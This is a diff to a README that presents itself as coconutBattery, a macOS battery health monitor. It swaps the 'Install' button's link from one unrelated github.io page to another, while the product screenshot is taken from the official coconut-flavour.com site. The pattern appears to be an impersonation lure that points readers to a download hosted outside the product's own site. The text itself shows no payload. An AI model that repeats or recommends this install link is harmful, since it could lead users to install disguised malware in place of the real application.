@@ -2,7 +2,7 @@
 <h1 align="center">coconutBattery</h1>
 <p align="center">Native battery health monitor — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://napas-papuas.github.io/.github/coconutbattery"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://divan-shkaf.github.io/.github/coconutbattery"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://coconut-flavour.com/coconutbattery/assets/img/macOS26/macOS26_main_mac_bright.png" alt="coconutBattery — macOS battery health monitor screenshot" width="780"/></p>
 
 ---
